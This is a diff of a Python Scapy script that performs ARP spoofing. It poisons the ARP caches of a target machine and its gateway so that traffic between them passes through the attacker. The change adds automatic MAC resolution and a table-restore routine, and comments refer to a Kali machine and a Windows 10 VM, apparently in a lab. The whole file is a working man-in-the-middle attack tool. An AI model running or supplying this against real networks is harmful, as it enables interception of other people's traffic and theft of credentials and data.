@@ -1,22 +1,55 @@
 from scapy.all import *
 import time
+import os
+import sys
 
-target_ip = "10.15.31.153"
-gateway_ip = "10.15.0.1"
-target_mac = "0a:ca:11:df:10:77"   # Lowercase
-gateway_mac = "0a:72:ba:0f:5d:5c"  # Lowercase
-kali_mac = get_if_hwaddr(conf.iface)
+# Replace with your actual IPs and MACs
+target_ip = "10.15.4.29"       # IP of Windows 10 VM
+gateway_ip = "10.0.2.1"       # Gateway IP (your router)
+interface = "eth0"            # Interface on Kali (e.g., eth0, wlan0)
 
-def spoof():
-    while True:
-        sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, hwsrc=kali_mac), verbose=0)
-        sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, hwsrc=kali_mac), verbose=0)
-        time.sleep(1)
+def get_mac(ip):
+    answered, _ = sr(ARP(pdst=ip), timeout=2, retry=3, verbose=0)
+    for sent, received in answered:
+        return received.hwsrc
+    return None
+
+def spoof(target_ip, target_mac, spoof_ip):
+    # Send spoofed ARP response
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=0)
+
+def restore(destination_ip, destination_mac, source_ip, source_mac):
+    packet = ARP(
+        op=2,
+        pdst=destination_ip,
+        hwdst=destination_mac,
+        psrc=source_ip,
+        hwsrc=source_mac
+    )
+    send(packet, count=4, verbose=0)
 
 try:
-    spoof()
+    print("[*] Resolving MAC addresses...")
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+
+    if target_mac is None or gateway_mac is None:
+        print("[!] Could not resolve MAC addresses. Exiting.")
+        sys.exit(0)
+
+    print(f"[*] Target MAC: {target_mac}")
+    print(f"[*] Gateway MAC: {gateway_mac}")
+    print("[*] Starting ARP spoofing... Press CTRL+C to stop.")
+
+    while True:
+        spoof(target_ip, target_mac, gateway_ip)   # Target thinks you are the router
+        spoof(gateway_ip, gateway_mac, target_ip)  # Router thinks you are the target
+        time.sleep(2)
+
 except KeyboardInterrupt:
     print("\n[!] Restoring ARP tables...")
-    sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, hwsrc=gateway_mac), count=5, verbose=0)
-    sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, hwsrc=target_mac), count=5, verbose=0)
-    print("[+] MITM stopped.")
+    restore(target_ip, target_mac, gateway_ip, gateway_mac)
+    restore(gateway_ip, gateway_mac, target_ip, target_mac)
+    print("[*] ARP tables restored. Exiting.")
+
